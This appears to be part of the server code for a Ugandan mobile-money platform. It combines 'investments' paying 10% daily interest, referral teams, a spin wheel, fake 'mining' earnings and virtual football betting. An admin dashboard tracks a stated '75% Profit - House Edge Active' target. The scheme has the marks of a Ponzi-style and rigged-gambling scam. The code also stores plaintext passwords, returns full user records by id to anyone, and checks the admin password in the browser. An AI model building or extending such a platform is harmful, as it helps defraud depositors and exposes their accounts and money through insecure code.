function check(){if(pass.value===AP){en=pass.value;loginBox.style.display="none";adminBox.style.display="block";ld(); loadVirt();}}
function showTab(t){document.getElementById('depBox').style.display=t==='dep'?'block':'none';document.getElementById('virtBox').style.display=t==='virt'?'block':'none'; if(t==='dep') ld(); if(t==='virt') loadVirt();}
async function ld(){let r=await fetch("/api/admin/deposits?key="+en);let d=await r.json();document.getElementById('l').innerHTML=d.map(x=>"<div class=card><b>"+x.phone+"</b> - "+x.amount+" UGX<br><small>"+x.airtelNo+"</small><br><button onclick=ap("+x.id+")>Approve</button></div>").join('')||"No pending deposits";}
async function ap(id){await fetch("/api/admin/approve/"+id+"?key="+en,{method:"POST"});ld();}
async function loadVirt(){
  let r=await fetch("/api/admin/virtual?key="+en);let d=await r.json();
  let acc=d.accas||[]; let singles=d.singles||[];
  let totalStaked=0, totalPaid=0, lost=0, won=0;
  for(let b of singles){ totalStaked+=parseInt(b.amount)||0; if(b.status==='won'){ totalPaid+=parseInt(b.winAmount)||0; won++; } else if(b.status==='lost'){ lost++; } }
  for(let b of acc){ totalStaked+=parseInt(b.amount)||0; if(b.status==='won'){ totalPaid+=parseInt(b.winAmount)||0; won++; } else if(b.status==='lost'){ lost++; } }
  let profit = totalStaked - totalPaid;
  let profitPct = totalStaked>0? (profit/totalStaked*100).toFixed(1) : 0;
  document.getElementById('profitBox').innerHTML="💰 TOTAL STAKED: "+totalStaked.toLocaleString()+" UGX<br>💸 PAID OUT: "+totalPaid.toLocaleString()+" UGX<br>📈 PROFIT: "+profit.toLocaleString()+" UGX ("+profitPct+"%)<br><small>Target: 75% Profit - House Edge Active</small><br>Won: "+won+" / Lost: "+lost+" bets";
  let html="<div class=card><b>Recent ACCA Bets (x2.00 odds)</b></div>";
  acc.slice(0,20).forEach(a=>{ let sels=[]; try{sels=JSON.parse(a.selections)}catch(e){}; html+="<div class=card style=border-left-color:"+(a.status==='won'?'#0f0':a.status==='lost'?'red':'gold')+"><b>"+a.phone+"</b> "+sels.length+" legs x"+(a.odd||0).toFixed(2)+" - "+a.amount+" UGX → <span style=color:"+(a.status==='won'?'#0f0':'red')+">"+a.status.toUpperCase()+"</span> "+(a.winAmount||0)+"</div>"; });
  document.getElementById('lvirt').innerHTML=html;
}
</script></body></html>`
};
function render(name,res){ res.send(pages[name]); }
app.get('/',(req,res)=>render('home',res));
app.get('/dashboard',(req,res)=>render('dash',res));
app.get('/deposit',(req,res)=>render('deposit',res));
app.get('/invest',(req,res)=>render('invest',res));
app.get('/referral',(req,res)=>render('referral',res));
app.get('/history',(req,res)=>render('history',res));
app.get('/virtual',(req,res)=>render('virtual',res));
app.get('/admin',(req,res)=>render('admin',res));
app.get('/api/crypto',(req,res)=>{ res.json({btc:"$67,450"}); });
app.get('/api/virtual/status',(req,res)=>{
  if(!liveFixtures && (!nextFixtures || nextFixtures.length===0)){ nextFixtures=genMatchday(); virtualPhase='betting'; virtualTimeLeft=118; }
  res.json({season, matchday, phase:virtualPhase, timeLeft:virtualTimeLeft, current:liveFixtures?liveFixtures[0]:null, allLive:liveFixtures, next:nextFixtures[0]||null, nextAll:nextFixtures||[]});
});
app.get('/api/virtual/myaccas/:id',async(req,res)=>{ try{ const [r]=await db.query("SELECT * FROM virtual_accas WHERE userId=? ORDER BY id DESC LIMIT 20",[req.params.id]); res.json(r.map(x=>{ try{ return {...x, selections: JSON.parse(x.selections)} }catch{ return x; } })); }catch(e){res.json([])} });
app.post('/api/virtual/bet/acca',async(req,res)=>{
 try{
  const {userId, amount, selections}=req.body;
  if(!selections || selections.length<1) return res.status(400).json({error:"Select at least 1!"});
  if(parseInt(amount)<200) return res.status(400).json({error:"Min 200"});
  if(!db) return res.status(400).json({error:"DB not ready"});
  const [u]=await db.query("SELECT gameBalance FROM users WHERE id=?",[userId]);
  if(!u.length || u[0].gameBalance < amount) return res.status(400).json({error:"No Game Wallet"});
  if(virtualPhase!=='betting') return res.status(400).json({error:"Betting only before kickoff!"});
  let odd=Math.pow(2, selections.length);
  if(selections.length===8) odd=256;
  await db.query("UPDATE users SET gameBalance=gameBalance-? WHERE id=?",[parseInt(amount), userId]);
  await db.query("INSERT INTO virtual_accas (userId,season,matchday,selections,amount,odd) VALUES (?,?,?,?,?,?)",[userId, season, matchday, JSON.stringify(selections), parseInt(amount), odd]);
  res.json({ok:1, odd, potential: Math.floor(parseInt(amount)*odd)});
 }catch(e){ res.status(400).json({error:e.message}) }
});
app.post('/api/register',async(req,res)=>{ try{ const code='LIFE'+Math.random().toString(36).slice(2,6).toUpperCase(); await db.query("INSERT INTO users (fullName,phone,password,myReferralCode,referredBy,balance,gameBalance) VALUES (?,?,?,?,?,0,0)",[req.body.name,req.body.phone,req.body.password,code,req.body.ref||null]); const[r]=await db.query("SELECT * FROM users WHERE phone=? ORDER BY id DESC LIMIT 1",[req.body.phone]); res.json(r[0]); }catch(e){res.status(400).json({error:e.message})} });
app.post('/api/login',async(req,res)=>{ try{ const[r]=await db.query("SELECT * FROM users WHERE phone=? AND password=?",[req.body.phone,req.body.password]); if(r.length) res.json(r[0]); else res.status(401).json({error:"Wrong"}); }catch(e){ res.status(401).json({error:"Wrong"}) } });
app.get('/api/user/:id',async(req,res)=>{ try{ const[u]=await db.query("SELECT * FROM users WHERE id=?",[req.params.id]); if(!u.length) return res.json({balance:0,gameBalance:0}); const[inv]=await db.query("SELECT * FROM investments WHERE userId=? ORDER BY id DESC",[req.params.id]); let total=0; let now=new Date(); for(let i of inv){let d=Math.floor((now-new Date(i.startDate))/(1000*60*60*24)); if(d<0)d=0; total+=Math.floor((i.amount||0)*10/100*d);} const[spinCheck]=await db.query("SELECT * FROM spins WHERE userId=? AND DATE(createdAt)=CURDATE()",[req.params.id]); const[mining]=await db.query("SELECT * FROM mining WHERE userId=? ORDER BY id DESC LIMIT 1",[req.params.id]); let miningEarn=0; if(mining.length && mining[0].isMining){ let mins=Math.floor((now-new Date(mining[0].lastClaim))/(1000*60)); miningEarn=mins*2; } res.json({...u[0], totalInterest:total, investments:inv, hasSpunToday: spinCheck.length>0, miningPending: miningEarn, isMining: mining.length?mining[0].isMining:0}); }catch(e){ res.json({balance:0,gameBalance:0}); } });
app.post('/api/spin',async(req,res)=>{ try{ const uid=req.body.userId; const[inv]=await db.query("SELECT COUNT(*) as c FROM investments WHERE userId=?",[uid]); if(inv[0].c===0) return res.status(400).json({error:"Invest first!"}); const[last]=await db.query("SELECT * FROM spins WHERE userId=? AND DATE(createdAt)=CURDATE()",[uid]); if(last.length) return res.status(400).json({error:"Already spun"}); const prizes=[0,100,200,300,500,1000,2000,100]; let win=prizes[Math.floor(Math.random()*prizes.length)]; await db.query("INSERT INTO spins (userId,amount) VALUES (?,?)",[uid,win]); if(win>0) await db.query("UPDATE users SET gameBalance=gameBalance+? WHERE id=?",[win,uid]); res.json({win}); }catch(e){ res.status(400).json({error:e.message}) } });
app.post('/api/mining/start',async(req,res)=>{ try{ const uid=req.body.userId; const[m]=await db.query("SELECT * FROM mining WHERE userId=?",[uid]); if(m.length){ await db.query("UPDATE mining SET isMining=1, lastClaim=NOW() WHERE userId=?",[uid]); } else { await db.query("INSERT INTO mining (userId,earned,isMining) VALUES (?,0,1)",[uid]); } res.json({ok:1}); }catch(e){res.json({ok:1})} });
app.post('/api/deposit',async(req,res)=>{ try{ const {userId, amount, airtelNo, screenshot} = req.body; const[u]=await db.query("SELECT phone FROM users WHERE id=?",[userId]); await db.query("INSERT INTO deposits (userId,phone,amount,airtelNo,screenshot) VALUES (?,?,?,?,?)",[userId, u[0]?u[0].phone:"", parseInt(amount), airtelNo, screenshot]); res.json({ok:1}); }catch(e){ res.status(400).json({error:e.message}) } });
app.post('/api/invest',async(req,res)=>{ try{ const{userId,club,amount}=req.body; if(amount<2000) return res.status(400).json({error:"Min 2000"}); const[u]=await db.query("SELECT balance FROM users WHERE id=?",[userId]); if(!u[0] || u[0].balance<amount) return res.status(400).json({error:"No balance"}); await db.query("UPDATE users SET balance=balance-? WHERE id=?",[amount,userId]); await db.query("INSERT INTO investments (userId,club,amount,rate,lockDays) VALUES (?,?,?,?,?)",[userId,club,amount,10,10]); res.json({ok:1}); }catch(e){ res.status(400).json({error:e.message}) } });
app.get('/api/history/:id',async(req,res)=>{ try{ const uid=req.params.id; const[deps]=await db.query("SELECT id,amount,status,createdAt,'deposit' as type FROM deposits WHERE userId=?",[uid]); const[accas]=await db.query("SELECT id,amount,status,createdAt,'acca' as type FROM virtual_accas WHERE userId=?",[uid]); let all=[...deps,...accas].sort((a,b)=> new Date(b.createdAt)-new Date(a.createdAt)); res.json(all); }catch(e){res.json([])} });
app.get('/api/team/:id',async(req,res)=>{ try{ const[u]=await db.query("SELECT * FROM users WHERE id=?",[req.params.id]); const[team]=await db.query("SELECT phone,fullName FROM users WHERE referredBy=?",[u[0].myReferralCode]); res.json({code:u[0].myReferralCode, team}); }catch(e){res.json({team:[]})} });
app.get('/api/admin/deposits',async(req,res)=>{ if(req.query.key!==ADMIN_KEY) return res.status(401).json([]); const[r]=await db.query("SELECT * FROM deposits WHERE status='pending' ORDER BY id DESC"); res.json(r); });
app.post('/api/admin/approve/:id',async(req,res)=>{ if(req.query.key!==ADMIN_KEY) return res.status(401).json({}); const[d]=await db.query("SELECT * FROM deposits WHERE id=?",[req.params.id]); if(!d.length) return res.json({}); await db.query("UPDATE deposits SET status='approved' WHERE id=?",[req.params.id]); await db.query("UPDATE users SET balance=balance+? WHERE id=?",[d[0].amount,d[0].userId]); res.json({ok:1}); });
app.get('/api/admin/virtual',async(req,res)=>{ if(req.query.key!==ADMIN_KEY) return res.status(401).json({}); try{ const[r]=await db.query("SELECT v.*, u.phone FROM virtual_bets v JOIN users u ON v.userId=u.id ORDER BY v.id DESC LIMIT 100"); const[r2]=await db.query("SELECT a.*, u.phone FROM virtual_accas a JOIN users u ON a.userId=u.id ORDER BY a.id DESC LIMIT 100"); res.json({singles:r, accas:r2}); }catch(e){ res.json({singles:[], accas:[]}); } });

app.listen(process.env.PORT||3000,()=>console.log("FINAL x2.00 ALL ODDS - 75% PROFIT - STADIUM + SPIN"));
